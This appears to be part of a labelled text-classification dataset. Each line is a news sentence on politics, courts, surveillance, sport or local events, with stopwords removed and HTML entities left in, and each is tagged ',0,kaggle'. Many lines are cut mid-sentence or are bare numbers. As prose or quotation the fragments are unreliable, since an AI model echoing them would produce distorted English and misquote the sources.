+ Moore added uncovers sufficient evidence warrant criminal civil rights investigation death Johnson ask FBI conduct ,0,kaggle
+ The teenager &apos;s parents said hope video footage contain clues died ,0,kaggle
+ The Associated Press reports target Russian-made SA-125 missiles ,0,kaggle
+" During fire Helmbrechts , rescue services found charred body three-bedroom house ",0,kaggle
+" Whether person living house yet unclear , said police spokesperson Bayreuth ",0,kaggle
+" It &apos;s called &quot; The Audacity Win , &quot; &apos;s memoir Barack Obama &apos;s 2008 presidential campaign ",0,kaggle
+" When I &apos;m finished patient write-ups night get bed , book returns time politics inspired millions speeches could take breath away ",0,kaggle
+" It &apos;s hard remember days optimism -- seem distant memory , sad reminder opportunities gone ",0,kaggle
+" I credit Obama great varied accomplishments , passage Affordable Care Act military exit Iraq , end &quot; &apos;t ask &apos;t tell , &quot; killing Osama bin Laden ",0,kaggle
+" &quot; And , recently , cannot excuse failure design simple website three years since Affordable Care Act signed law ",0,kaggle
+ That troubles ,0,kaggle
+" &apos; It &apos;s five years later , Mr",0,kaggle
+ The team &apos;s eye goal must considerably improved ,0,kaggle
+" The system , officially became operational yesterday , importance Sulzbachweg / Kirchstrasse junction ",0,kaggle
+" &quot; According current measurements , around 12,000 vehicles travel town Gutach B33 daily basis , heavy goods traffic accounts around ten per cent , &quot; emphasised Arnold ",0,kaggle
+" Therefore construction additional set lights necessary: &quot; Here safety comes first , &apos;s simple , &quot; said Arnold ",0,kaggle
+" And also energy-efficient: The older light systems consume around 100 Watts , new ones consuming eight ",0,kaggle
+ So mouth warms protein raise pH level ice cream glow ,0,kaggle
+ He said: &quot; I really want develop invisible ice cream ,0,kaggle
+" The newspaper tasked private investigator Glenn Mulcaire hacking Pawlby &apos;s voicemails &quot; door-stepped &quot; , Coulson also called left voicemails , court heard ",0,kaggle
+" What first ? Does know phone hacking ? He says &apos;t , say &quot; Oh yes , &quot; ",0,kaggle
+" Rumours affair involving Clarke first picked NotW &apos;s features desk source sexually interested Ms Pawlby told: &quot; Don &apos;t bother wasting time , &apos;s Charles ",0,kaggle
+" &quot; During period investigated , Ms Pawlby &apos;s grandparents received anonymous calls asking information , Mr Edis said ",0,kaggle
+" Leaving voicemail June 18 2005 , Coulson told her: &quot; I &apos;ve got story &apos;re planning run tomorrow I really would like speak Charles ",0,kaggle
+ Coulson Brooks deny conspiring others hack phones October 3 2000 August 9 2006 ,0,kaggle
+ GM recalls new pickup trucks U,0,kaggle
+ GM shares 1,0,kaggle
+4 percent $ 37,0,kaggle
+" UN hails new goals tackle poverty The United Nations start work immediately new set goals replace millennium development goals , put place 12 years ago tackle global poverty ",0,kaggle
+" Janson old hand comes profession , art acting ",0,kaggle
+" The old man , Santiago , best comes fishing ",0,kaggle
+" Furthermore , role old fisherman character role , , Janson masters excellently ",0,kaggle
+" Hemingway told story fighter , courageous man &apos;t give ultimately wins battle fish result knowledge strong ",0,kaggle
+" For long periods , Janson performer stage ",0,kaggle
+ The CDC found prevalence food allergies among children increased 18 percent 1997 2007 ,0,kaggle
+" The guide contains information schools make faculty staff aware children &apos;s food allergies , handle allergic reaction occur ",0,kaggle
+ Newly promoted Düsseldorf Baskets 23 May submit documents arbitration panel prove financial fitness Bundesliga ,0,kaggle
+ The Court Arbitration authority last resort ,0,kaggle
+ He also stated increasing number employed persons looking long-term care support relatives ,0,kaggle
+" &quot; After , people learned merits region studies often remain within region , along acquired knowledge skills , contributes strengthening region , &quot; said State Parliamentary President , expressing thorough conviction ",0,kaggle
+ This announced Ulrich Knobel organising Illmensee Sports Club ,0,kaggle
+ The pair managed break away field keeping expectations ,0,kaggle
+ The increasing number riders live work area fantastic development ,0,kaggle
+ Pangerl sped finish line first place ,0,kaggle
+ Hermann Warthmann reached finish line simultaneously take joint third overall standings ,0,kaggle
+3tn changes hands day ,0,kaggle
+" &quot; Our ongoing inquiry matter continues co-operating fully FCA regulators , &quot; bank said two weeks ago ",0,kaggle
+" Mr Usher &apos;s instant message group included bankers Barclays Citigroup , people close situation said ",0,kaggle
+ Banks scouring years &quot; worth instant messages emails search instances wrongdoing ,0,kaggle
+" Some bankers tried play affair saying vast highly liquid foreign exchange market almost impossible manipulate , senior traders saying necessarily true ",0,kaggle
+" A senior trader said despite huge volume daily foreign exchange trading , fragmentation liquidity different trading platforms banks &quot; increasing use internal platforms meant &quot; start get impact market quite small ticket prices ",0,kaggle
+ A study aiming increase benefits Scotland HS2 rail project announced UK government ,0,kaggle
+" When Phase Two completed , lines run Manchester Leeds ",0,kaggle
+" Pawning jewellery merely fast way land cash - S $ 1,300 Ms Amirthalinga &apos;s case - almost cheap unsecured bank loans ",0,kaggle
+" On Thursday , data showed continued export weakness , softening consumer demand ",0,kaggle
+" Historically high prices gold past two years added rush pawn personal belongings , people take opportunity cash value family jewellery ",0,kaggle
+" While discount lenders come fire high interest rates , Ms Yeah says pawning offer cheaper rates lenders , also add directly debt ",0,kaggle
+ We see customers walks life ,0,kaggle
+" &quot; They include wealthy individuals need borrow short term business ventures investments , small businesses need tide cash flow needs , &quot; says Ms Yeah ",0,kaggle
+ Here standard private television production presented purest form ,0,kaggle
+ The trick: Here fir branches smoker provide special flavour Black Forest ham ,0,kaggle
+" &quot; That really delicious , &quot; said TV star conclusion ",0,kaggle
+" Her models include classic care models , alternative living arrangements often-mentioned pensioners &apos; living community ",0,kaggle
+ Definitely nothing like student accommodation shared bathroom kitchen ,0,kaggle
+ With opinion least alone State Capital ,0,kaggle
+ Nowadays many possibilities designing house apartment way barrier-free ,0,kaggle
+ Ries recommends working age-appropriate renovation house apartment first seek in-depth information &apos;t simply use first tradesman comes along ,0,kaggle
+" Even case rental apartments landlords work carried , even matter raising level toilet seat , clarified interior designer ",0,kaggle
+ Waltraud Ries go experience ,0,kaggle
+" Among others , airports Kopenhagen , Frankfurt Dubai already done away noisy call-outs ",0,kaggle
+" British police serve Assange extradition notice Btitish police served extradition notice today WikiLeaks founder Julian Assange , taken refuge Ecuador &apos;s embassy London requested asylum ",0,kaggle
+" Scotland Yard said served &quot; surrender notice &quot; 40-year-old Australian requiring appear police station , adding failure would make liable arrest ",0,kaggle
+" Assange faces extradition Sweden sex crime allegations , exhausted options British law Supreme Court overturned appeal extradition earlier month ",0,kaggle
+" Fearing Stockholm would pass US , sought refuge Ecuador &apos;s embassy London June 19 , asking South American country political asylum ",0,kaggle
+ Claims outage caused distributed denial service &#91; DDoS &#93; attack true ,0,kaggle
+" Earlier NSA spokesperson told ABC News agency &apos;s internal , sensitive network &quot; &quot; compromised ",0,kaggle
+ Such growing controversy surrounding agency prompted early speculation tonight &apos;s incident result targeted cyber operation ,0,kaggle
+" The so-called &apos; German Mass &apos; , original title &quot; Gesänge zur Feier des heiliges Opfers der Messe &quot; (Songs celebrate holy sacrifice mass), D 872 , spiritual work composer Franz Schubert , dating 1826 , time written considered almost revolutionary ",0,kaggle
+" If municipalities agree reconstruction measures , required contribute one third costs , remainder divided Deutsche Bahn Federal Government ",0,kaggle
+" The Administrative Department Deutsche Bahn &apos;s reconstruction plans investigated Breinlinger Engineering Office , doubts whether planned connection Geroltzhäuser Weg straightforward ",0,kaggle
+ Dieter Thomas Kuhn Stuttgart: The &quot; singing mountain wave &quot; open-air stage Stuttgart - &quot; When summer ? &quot; actually question people &apos;s lips Killesberg Open-Air Theatre Friday evening ,0,kaggle
+ Click image gallery performance &quot; singing mountain wave &quot; ,0,kaggle
+" Gender identification still well understood , experts United States say sex cannot determined , &apos;s better use best available information assign wait monitor child &apos;s psychological physical development undertaking surgery , ",0,kaggle
+ The science knowing child develop gender identity accurate ,0,kaggle
+" These features manifest secondary sexual characteristics , muscle mass , hair distribution , breasts stature; primary sexual characteristics reproductive organs genitalia; chromosomal structures hormones ",0,kaggle
+" In June , 52-year-old Australian , Norrie May-Welby , became world &apos;s first recognized &quot; genderless &quot; person winning legal appeal keep &quot; unspecified &quot; gender status life ",0,kaggle
+ The U,0,kaggle
+" website Catholic Online also opposed German law , writing &quot; world dragged new state , gender choice , sexual activity , reverse two pillars civilization ",0,kaggle
+" And little decade ago , medical community thought gender slate could erased redrawn ",0,kaggle
+" &quot; Money presented case successful case transition , , &quot; said Drescher ",0,kaggle
+" But 38 , committed suicide ",0,kaggle
+" &quot; But 1990s , advent Internet , survivors gender surgeries come forward &quot; happy outcome ",0,kaggle
+" &quot; I knew I &apos;t girl , &quot; told ABCNews",0,kaggle
+ I sterilized birth -- one ever told ,0,kaggle
+ Bruce born DSD prevented body producing enough testosterone properly develop genitals ,0,kaggle
+" But &apos;t seen law play , speculate ",0,kaggle
+" She vagina , uterus ovaries ",0,kaggle
+" &apos; This way , OK -- raise child , love child ",0,kaggle
+" Ultimately , child decide sex feels comfortable -- &apos;s wonderful thing ",0,kaggle
+" The meeting point tours Cologne Tourism Service Centre , right cathedral ",0,kaggle
+ Schulze one surprise ,0,kaggle
+" The Mikwe form part archaeological area Town Hall Square , construction work set begin shortly ",0,kaggle
+" Chief executive officer Phillip Hare asked one case YMCA employee charged child pornography offences , another gym instructor YMCA Caringbah Hall convicted child sexual offences children care 1991 ",0,kaggle
+ &quot; The CEO said accept staff &apos;s evidence uncomfortable reporting upwards managers ,0,kaggle
+" Mr Hare said provided view YMCA NSW board lesson organisation &quot; Jonathan Lord incident &quot; &quot; reporting &quot; staff , board agreed ",0,kaggle
+" Perhaps crazy , perhaps drugs affected brain ",0,kaggle
+ A fantastic writer ,0,kaggle
+" &quot; We arrest individuals &apos;ve broken law , &quot; says government official ",0,kaggle
+" &quot; We get first , commit act violence &quot; ",0,kaggle
+ They read time streams ,0,kaggle
+ Then watcher watched convicted future crime ,0,kaggle
+ It devises conditions ,0,kaggle
+ Court blocks ruling NYPD stop-and-frisk policy A federal appeals court Thursday blocked judge &apos;s order requiring changes New York Police Department &apos;s stop-and-frisk program removed judge case ,0,kaggle
+ Circuit Court Appeals said decisions Judge Shira Scheindlin stayed pending outcome appeal city ,0,kaggle
+" The city appealed findings remedial orders , including decision assign monitor help police department changes policy training program associated ",0,kaggle
+ judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court ,0,kaggle
+" An oral argument city &apos;s appeal scheduled sometime March 14 , 2014 ",0,kaggle
+ The stop-and-frisk tactic criticized number civil rights advocates ,0,kaggle
+" Supporters changes NYPD &apos;s stop-and-frisk program say changes end unfair practices , mold trusted effective police force affect police departments use policy ",0,kaggle
+ The administration said come surprise 5 percent population purchase insurance may forced switch plans coverage &apos;t meet new standards required Affordable Care Act ,0,kaggle
+" &quot; I frustrated angry anyone , &quot; said ",0,kaggle
+ I eager earn confidence back ,0,kaggle
+" An exasperated Sebelius uttered phrase , caught hot mic , aide seated behind yesterday &apos;s House hearing following contentious exchange Rep",0,kaggle
+" Billy Long , R-Mo ",0,kaggle
+"gov , pitching millions Americans ",0,kaggle
+" In spite heart defect , Burt could deterred pursuing dream ",0,kaggle
+" Under management Federal Employment Agency , 49 men women already working within industry untrained workers , trained qualified hotel restaurant staff course three winters ",0,kaggle
+" Also involved project Chamber Industry Commerce Neubrandenburg German Hotel Restaurant Association (Deutsche Hotel- und Gaststätte , Dehoga) Mecklenburg-Western Pomerania ",0,kaggle
+ Frankfurt parking fees increase dramatically Parking Frankfurt could soon noticeably expensive ,0,kaggle
+ The City Council must reach decision December ,0,kaggle
+ The Verkehrsclub Deutschland (German Traffic Club) opinion increase two decades &quot; completely appropriate actually long overdue &quot; ,0,kaggle
+ Schmidt wish contact colleagues skirmish Hütter ,0,kaggle
+" Most , manner team playing impressive ",0,kaggle
+ We must stay composed keep ,0,kaggle
+ Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog ,0,kaggle
+" The Independent Commission Against Corruption (ICAC) Friday widened inquiry whether Mr Obeid lobbied several state ministers leases Circular Quay , Obeids owned two restaurants cafe , renewed without going tender expiration August 2005 ",0,kaggle
+ They accompanied strict security precautions ,0,kaggle
+ The two accused acquitted initial trial beginning 2012 ,0,kaggle
+ The assailants worn masks recognised ,0,kaggle
+ Proceedings initially mainly involved reconstruction series events night crime ,0,kaggle
+ The police inspector responsible time invited witness ,0,kaggle
+ This also applies case victims ,0,kaggle
+ Car driver seriously injured accident A 37-year-old car driver Aachen seriously injured accident Thursday evening ,0,kaggle
+" According information police , 41-year-old Müsch travelling car Kempener bypass direction Grefrath , around 9",0,kaggle
+ Töniser Straße failed see 37-year-old &apos;s oncoming vehicle ,0,kaggle
+ &quot; Businesses could also required account number 457 visa holders previously businesses intended sponsor small number workers employed hundreds ,0,kaggle
+" While airport management announced via short messaging service Twitter shooter custody , &quot; Los Angeles Times &quot; reported man dead ",0,kaggle
+ The man reported taken safety area ,0,kaggle
+ Users Twitter published photos SWAT officer weapon lying ground ,0,kaggle
+" The access roads blocked , , according CNN , caused long tailbacks ",0,kaggle
+" Except landing arrival aircraft , flight traffic temporarily suspended , reported ",0,kaggle
+" According Tribukait , tourist objective vision coincided goal preserving extremely overgrown old Allmend grazing pasture , specific protected habitats , opening connection still existing grazing land ",0,kaggle
+ The current measures integrate seamlessly plans ,0,kaggle
+" A biosphere area offers chance sustainable economic ecological development basis internationally recognised Unesco status , thus offers extension achieved thus far Life Project previous care days ",0,kaggle
+" During trial , Kana admitted bar Booysen night attack ",0,kaggle
+" &quot; Pope Francis decided communicate decision convoke February &apos;s consistory advance order facilitate planning meetings involving participation cardinals different parts world , &quot; Lombardi said ",0,kaggle
+" Next year &apos;s consistory would significant would first since Francis elected March year , Valero said ",0,kaggle
+" &quot; It interesting see whether new Pope nominate cardinals rest world restore balance , &quot; said ",0,kaggle
+" The cardinals also first chosen since Francis formed Council Cardinals , group eight cardinals around world tasked looking ways reform church ",0,kaggle
+" A cost calculation performed team professionals , submitted Town Council , make decision determine ongoing procedure ",0,kaggle
+" The pupils Bräunlingen Primary School , taught well renovated old school building , new hall , soon able use old school yard well ",0,kaggle
+" A black box car ? As America &apos;s road planners struggle find cash mend crumbling highway system , many beginning see solution little black box fits neatly dashboard car ",0,kaggle
+" Libertarians joined environmental groups lobbying allow government use little boxes keep track miles drive , possibly drive - use information draw tax bill ",0,kaggle
+" And Congress &apos;t agree whether proceed , several states waiting ",0,kaggle
+ His state recently put tracking devices 500 cars test pay-by-mile system ,0,kaggle
+ California planners looking system devise strategies meet goals laid state &apos;s ambitious global warming laws ,0,kaggle
+ Bill Shuster (R-Pa ,0,kaggle
+ People paying directly getting ,0,kaggle
+" Transportation secretaries , 2011 report urged Congress move pay-per-mile direction ",0,kaggle
+" Senate approved $ 90-million pilot project last year would involved 10,000 cars ",0,kaggle
+ The concept universal hit ,0,kaggle
+" In Nevada , 50 volunteers &apos; cars equipped devices long ago , drivers uneasy government able monitor every move ",0,kaggle
+" &quot; There need build enormous , unwieldy technological infrastructure inevitably expanded keep records individuals &apos; everyday comings goings ",0,kaggle
+ The firm originally business helping states tax drivers ,0,kaggle
+" It seeking break emerging market auto insurance , drivers would pay based mileage ",0,kaggle
+" &quot; People willing track speed track location , &quot; said Ryan Morrison , chief executive True Mileage ",0,kaggle
+" In New York City , transportation officials seeking develop taxing device would also equipped pay parking meter fees , provide &quot; pay-as-you-drive &quot; insurance , create pool real-time speed data drivers motorists could use avoid traffic ",0,kaggle
+" &quot; Motorists would attracted participate value benefits offers , &quot; says city planning document ",0,kaggle
+" At Metropolitan Transportation Commission San Francisco Bay Area , officials say Congress could simply deal bankrupt Highway Trust Fund raising gas taxes ",0,kaggle
+" An extra one-time annual levy could imposed drivers hybrids others whose vehicles &apos;t use much gas , pay fair share ",0,kaggle
+" This reported Interfax Agency reference groups aware situation , named greater detail ",0,kaggle
+ The Hammereisenbach Music Society gave open-air concert terrace Hammer Guest House ,0,kaggle
+" In letter , Mr Snowden said believed support international community could persuade US government abandon criminal charges ",0,kaggle
+ The charges filed US justice department include espionage theft government property ,0,kaggle
+ &quot; Relations US Germany come strain following claims NSA bugged Chancellor Angela &apos;s Merkel &apos;s phone ,0,kaggle
+ &quot; Arctic Monkeys postpone Glasgow gig due Alex Turner &apos;s illness Rock band Arctic Monkeys postponed gig Glasgow lead singer diagnosed laryngitis ,0,kaggle
+ The band &apos;s announcement came forced similarly postpone gig LG Arena Birmingham Thursday ,0,kaggle
+ We wish apologise ticket holders inconvenience caused ,0,kaggle
+" Only goalkeeper , Roman Weidenfeller , first BVB player step onto field , cheers briefly erupt , usually case ",0,kaggle
+" Even stadium announcer , Norbert Dickel , speaking successful results recent days - derby victory , win Arsenal , contract extension coach Jörgen klopp - raise spirits ",0,kaggle
+" &quot; There massive impact entire Ultra movement , &quot; announced BVB Chairman Thursday evening panel discussion Frankfurt ",0,kaggle
+" &quot; I banned , &quot; explained ",0,kaggle
+ It interesting see reactions south stand ,0,kaggle
+" Since stood June 2007 decade leader , Mr Blair largely avoided discussing British politics , confining comments foreign affairs role envoy Quartet Middle East peacemakers ",0,kaggle
+" Astronomers already found 1,000 planets near stars ",0,kaggle
+" The choice difficult one: Should search gravitational waves ? Or instead conduct research origin cosmos ? Or search planets similar Earth thus perhaps discover extraterrestrial life ? These questions currently asked responsible European Space Agency , ESA ",0,kaggle
+" At beginning September , elite field European space research met Paris discuss proposals missions ",0,kaggle
+" 30 ideas debate , five made onto short list ",0,kaggle
+" And star planets , circumstances life exist ? In order pursue question , &quot; Cheops &quot; space telescope launched 2017 , 500 known planetary systems proximity us investigated greater detail ",0,kaggle
+" With &quot; Solar Orbiter &quot; , ESA already approved M-class mission (for budget stands around half million Euro) address matter ",0,kaggle
+ The &quot; Juice &quot; (Jupiter Icy Moons Explorer) probe planned begin journey 2022 ,0,kaggle
+ How universe come consist ? 13,0,kaggle
+" With special telescope , probe examine distribution material universe across entire sky , thus enabling conclusions drawn regarding properties dark matter dark energy ",0,kaggle
+" Unlike systems Earth , could also prove gravitational waves created Big Bang , thus provide fresh knowledge regarding origin cosmos ",0,kaggle
+ South Stream meant add diversity Russia &apos;s export routes Europe ,0,kaggle
+" Miller said direct connection Bulgaria , member European Union , means geopolitical risks associated transit countries eliminated &quot; forever ",0,kaggle
+ &quot; Bulgarian consumers receive gas South Stream discounted rate entire project starts operating 2015 ,0,kaggle
+ Gazprom said construction begin downstream countries year &apos;s end ,0,kaggle
+" This Friday evening , &quot; Pump party &quot; event taking place , one day later , Saturday evening , festivities continue over-25s party ",0,kaggle
+" Pamela Anderson chops iconic blonde locks , debuts dramatic new pixie cut ",0,kaggle
+ Pam &apos;s blonde locks made famous role sexy TV show Baywatch ,0,kaggle
+ The ex-Baywatch babe ditched long blonde locks favour platinum pixie crop ,0,kaggle
+" Thus far , Kempten Police Department look back calm Halloween night ",0,kaggle
+" Because home owners realised immediately , egg remnants could cleaned , meaning material damage occurred ",0,kaggle
+ The municipality coffers Herdwangen-Schönach well stocked administration debt-free since 2005 ,0,kaggle
+ He Town Councillors clearly delighted good figures ,0,kaggle
+" From fascinating view world-famous skyline , particularly impressive evening light ",0,kaggle
+" Due time difference , pupils go almost 24 hours , however , true slogan , &quot; city never sleeps &quot; , day rounded trip Times Square ",0,kaggle
+" If Anna Benni communicate upcoming holiday travels via Gmail , Google display corresponding links holiday offers ",0,kaggle
+" However , theoretically , possible ",0,kaggle
+" How important Yahoo Google within e-mail market Germany ? According study conducted Convios Consulting August 2013 , among main mail services private use , Yahoo Google play minor role ",0,kaggle
+" In total , EUR 15,000 material damage caused , announced police ",0,kaggle
+" Due low level sunshine , autumn spring village Rjukan Vestfjord valley normally languishes shadows surrounding mountains ",0,kaggle
+" &quot; Finally ! &apos; , raved Mayor Steinar Bergsland inaugural ceremony , televised broadcaster TV2 ",0,kaggle
+" Up , hungry sunshine winter travel nearby peak cable car ",0,kaggle
+" After several years debate , Town Council finally approved project , cost 5 million krone (around EUR 615,000)",0,kaggle
+" Once , W514 local association organising large exhibition ",0,kaggle
+ Guests also invited take part tombola impressive prizes sample delicious food cafeteria ,0,kaggle
+ The crowning glory visit Abendmahlskirche ,0,kaggle
+" Last least , church eyes also turn last supper painting , painted Friedrich Schüz support Walter Kröll Georg Halbritter ",0,kaggle
+ Tickets available ticket office Nuclear Bunker Museum ,0,kaggle
+ A preliminary investigation showed Yangcheng Evening News Group &apos;s New Express published several untrue reports listed company Zoomlion period September 2012 August 2013 ,0,kaggle
+" &quot; New Express &apos;s editorial management disordered , &quot; regulator said statement ",0,kaggle
+ &quot; Mr Chen wrote several articles New Express alleging financial irregularities construction-equipment company called Zoomlion ,0,kaggle
+ I mainly I hankered money fame ,0,kaggle
+" Experts say confessions still routinely coerced , despite change law earlier year banning authorities forcing anyone incriminate ",0,kaggle
+" The waiting time must , however , &quot; appropriate &quot; , interpreted differently case-to-case basis ",0,kaggle
+" Anyone drives spite red light must , however , aware / fully liable resulting accident ",0,kaggle
+ He spared driving ban account special circumstances - spared fine ,0,kaggle
+"9 billion candy , costumes decorations , according National Retail Federation ",0,kaggle
+" Women &apos;t sexy professionals anymore; also sexy foods like pizza , hamburgers carrots ",0,kaggle
+" In fact , Americans spend $ 330 million pet costumes year , according NRF ",0,kaggle
+ Commerce Department ,0,kaggle
+ Nothing quintessentially Halloween haunted houses ,0,kaggle
+" &quot; Finally , let &apos;s talk pumpkins ",0,kaggle
+" Lucky us , &quot; baby pumpkin trend &quot; started last year thanks Pinterest , us grew carving gourds sitting ",0,kaggle
+" This year , Americans spend around $ 106 million pumpkins , according U",0,kaggle
+" The jack-o-lantern slowly withering front porch probably came Illinois , grew 542 million pounds pumpkin year ",0,kaggle
+" , try carve 2,032 pound pumpkin ",0,kaggle
+" In announcement , operator cited technical problems reason ",0,kaggle
+ The recent incident latest series small large breakdowns suffered stock exchange operator ,0,kaggle
+" First , US investment bank Goldman Sachs sent large quantities incorrect purchase orders options markets due technical problems ",0,kaggle
+" Furthermore , last year listing Facebook stock exchange caused quite furore ",0,kaggle
+ Piercing beep disturbs residents Rhenus Midgard also invested highly land They stockpile coal arrives ships ,0,kaggle
+" In close consultation authorities , position make warning signals quieter means implementation technical measures ",0,kaggle
+"5 metres , time possible unload Capesize bulk carriers ",0,kaggle
+" Patek , spent almost 10 years run one South-East Asia &apos;s wanted , yesterday sentenced 20 years jail role building explosive devices used bombing ",0,kaggle
+" The decision reignited painful memories Perth mother June Corteen , lost 39-year-old twin daughters Jane Jenny destruction unleashed Patek co-conspirators almost decade ago ",0,kaggle
+ Peter Hughes Paddy &apos;s Bar suicide bomber detonated backpack loaded explosives 20 seconds earlier ,0,kaggle
+ Patek last Bali bombers face justice ,0,kaggle
+" &quot; There lot tears year , &quot; Ms Corteen said ",0,kaggle
+" On last weekend August , Vogtsbauernhof Black Forest Open Air Museum Gutach near Hornberg firmly hands children ",0,kaggle
+" It horses found admired grounds , many animals sheep , goats , cows chickens well ",0,kaggle
+ 5,0,kaggle
+ 50 grams apple sauce tablespoon ground linseed plus three tablespoons water also suitable ,0,kaggle
+" A dough becomes fluffy replacing egg mixture one tablespoon baking powder , one tablespoon cornflour three tablespoons mineral water , example ",0,kaggle
+ John Kerry says US spying &quot; reached far inappropriately &quot; unprecedented admission John Kerry indicated softening U,0,kaggle
+ &quot; And President determined try clarify make clear people thorough review order nobody sense abuse ,0,kaggle
+ He added: &quot; We &apos;re dealing new world people willing blow ,0,kaggle
+" So able intercept stop happens ? We actually prevented airplanes going , buildings blown , people assassinated &apos;ve able learn ahead time plans ",0,kaggle
+" Meanwhile , U",0,kaggle
+" And I &apos;m going Europe make clear need continue work together combatting terrorism , notwithstanding anger NSA programs ",0,kaggle
+" Amid uproar , Murphy said office arranging congressional trip , expected take place year , hopes delegation include members parties chambers ",0,kaggle
+ He said European leaders need honest people kind espionage programs &apos;ve used years ,0,kaggle
+" &quot; While amend surveillance programs better protect rights Europeans , also need come terms fact &apos;re ones spying , &quot; Murphy said ",0,kaggle
+" Regarding subject traffic , agenda Friday , SPD substantiated opposition car toll charge promoted CSU ",0,kaggle
+" &quot; In statement Thursday , representative Jagger , 70 , says &quot; categorically denies ever made pass Katy Perry ",0,kaggle
+ &quot; The rep adds: &quot; Perhaps confusing someone else ,0,kaggle
+" , 26-year-old man cycling illegally , left footpath Bahnhofplatz direction Marktstätte , ladies bicycle ",0,kaggle
+ Benchmark U,0,kaggle
+ crude December delivery 14 cents $ 96,0,kaggle
+" Over five weeks , supplies risen 25 million barrels ",0,kaggle
+58 barrel ICE exchange London ,0,kaggle
+" The deadline applications Monday 11 November , 6: 00 p",0,kaggle
+ The new vaccine contains harmless virus engineered carry genetic information make anti-nicotine antibodies ,0,kaggle
+" In tests , vaccinated mice subsequently given nicotine continued normal activity ",0,kaggle
+" But mice given vaccine &quot; chilled , &quot; say researchers , sign nicotine reached brains ",0,kaggle
+" Prof Crystal said future human vaccine completely safe could given children tempted try cigarette , preventing nicotine addiction ",0,kaggle
+ But likely would used smokers quit ,0,kaggle
+" &quot; Today , Egyptian people laid foundation new life - absolute freedom , genuine democracy stability , &quot; said Morsi , 60-year-old US-trained engineer Muslim Brotherhood , fundamentalist group spent 84 years since inception outlawed organisation harshly targeted successive governments ",0,kaggle
+" Only several hundred supporters gathered outside court cheer new president , departure presidential pomp Mubarak years , traffic briefly halted allow motorcade usually busy road linking city centre southern suburbs ",0,kaggle
+" But agreeing take official oath court , rather parliament customary , bowing military &apos;s indication contest power continue ",0,kaggle
+" Georgen three half years prison exploitative human trafficking , pimping , issuing threats grievous bodily harm ",0,kaggle
+" In collage prose texts For performance piece , &quot; Wetterleuchten auf der Zungenspitze &quot; (Summer lightning tip tongue), seen Garage X Petersplatz , Gerhard Fresacher , creates collage prose texts ",0,kaggle
+" However , Director Fresacher seems little trust text ",0,kaggle
+" Wrapped cellophane girdles , stumble dangerously high heels across set , either delivering monologues top voices lying completely silent stage ",0,kaggle
+ Silvia Kimmich-Bantle father Karl Kimmich entertained attendance popular tunes ,0,kaggle
+" Haslach: Scepticism visibly gives way confidence The 2015 Parish Council elections bring fundamental change , example Haslach Pastoral Care Unit (Seelsorgeeinheit Haslach , SE)",0,kaggle
+ There one joint Parish Council six parishes ,0,kaggle
+" &quot; In past , investments made projects could managed individual parishes , &quot; said Haslach &apos;s Parish Council Chairman Bruno Prinzbach ",0,kaggle
+" Barbar Ritter , Chair Committee Schutterwald-Neuried pastoral care unit , practical experience joint committee five parishes ",0,kaggle
+ Aircraft electronic device rules stay force Australia Australian airline passengers need continue turning tablets smart phones take-off landing despite moves US loosen regulations covering devices ,0,kaggle
+ Passengers already bulk flight many people find annoying unable access e-books take-offs landings ,0,kaggle
+" Australian carriers looking decision , requires US carriers undertake massive amount work meet requirements , indicated immediate plans change procedures ",0,kaggle
+" &quot; CASA currently specific regulations governing use electronic devices aircraft , &quot; said ",0,kaggle
+" Virgin , already talking CASA extending use in-flight wi-fi entertainment system , amenable change said would take lead regulator ",0,kaggle
+" &quot; We would welcome review CASA allowing use electronic devices really think improve customer experience (wireless in-flight entertainment) planes , &quot; spokesman said ",0,kaggle
+" Andrew Howie , 35 , Tiptree , Essex , spotted driving Mercedes Benz A120 Braintree 27 May ",0,kaggle
+" Taking stage men women smart bowler hats , tipped flat cap jaunty angle paraded two-year-old Toffee around ring ",0,kaggle
+ &quot; They comers two walked gold cup rosette ,0,kaggle
+ Complete strangers arena thought phenomenal wanted photos taken ,0,kaggle
+ Mrs Howells said: &quot; The whole place electric everybody cheering clapping ,0,kaggle
+ &quot; He running sand full length arena even though looked tiny marvellous job ,0,kaggle
+ They look good teamwork pony handler - Fenton Toffee best ring ,0,kaggle
+" I &apos;m sure Fenton helped cute clothes , really looked part ",0,kaggle
+" Also among dead said 2,202 army defectors 5,375 opposition fighters , many foreigners ",0,kaggle
+ The fighting underscored dangers chemical weapons &apos; inspectors face race tight deadlines mission rid Syria toxic arsenal midst ongoing civil war ,0,kaggle
+" They unable visit two sites security concerns , inspectors said ",0,kaggle
+ Time recorded water quantity measured vat end ,0,kaggle
+ The winners team individual contests receive prizes ,0,kaggle
+ Teams practice 10: 00 a,0,kaggle
+" In evening , fans brass band music treat ",0,kaggle
+" On Sunday , Leinstetten Music Society entertain audiences morning session , Böffingen Farmer &apos;s Band guests 2: 00 p",0,kaggle
+" Further attractions Sunday corn maze , craft market sheep shearing ",0,kaggle
+" Specially children , petting zoo , &quot; straw bouncy castle &quot; , tractor driving (under supervision) tractor surfing ",0,kaggle
+" True , Strathclyde paper pointed possible economic benefits freer movement rest Europe , though - predictably - figure headlines ",0,kaggle
+ Nor anyone point EU member states spend much time bending formal rules suits ,0,kaggle
+" Without possibility domestic currency devaluation , southern Europe finds built-in productivity disadvantage vis-à-vis Germany ",0,kaggle
+" That crippling cost disadvantage , &apos;ve already seen Grangemouth ",0,kaggle
+" After war , French political elite saw EU vehicle keep Germany check , give Paris equal billing world Washington ",0,kaggle
+" But Berlin longer needs Paris passport political legitimacy imposed economic policy Europe , leaving battered French economy struggling ",0,kaggle
+ Where leave Scotland ? We choose region (essentially) Little England ,0,kaggle
+" Saying many myths would &quot; far wild , far scandalous cases far filthy taught schools , &quot; Crossley-Holland advocated &quot; careful selection &quot; age-appropriate works ",0,kaggle
+" &quot; I find wonderful America , myth folklore already part education , &quot; said ",0,kaggle
+" He added authors teachers &quot; overtly didactic &quot; &quot; total switch-off &quot; children , messages &quot; subliminated &quot; enjoyable stories ",0,kaggle
+ And must subliminated; revealed story rather stated ,0,kaggle
+ The speaker Johanna Rahner ,0,kaggle
+ A post-doctoral lecturing qualification fundamental theology ecumenical theology followed 2003 Westfalian Wilhelm &apos;s University ,0,kaggle
+" This comes time possible shortage ministers: The Protestant Lutheran Regional Church Hanover calculates , things stand , current number around 1,800 pastors halved 2030 ",0,kaggle
+" Of course wages higher within private sector , hand , theologians secure employer ",0,kaggle
+" According information Regional Church , covers three quarters Lower Saxony , around 60 pastors retire every year ",0,kaggle
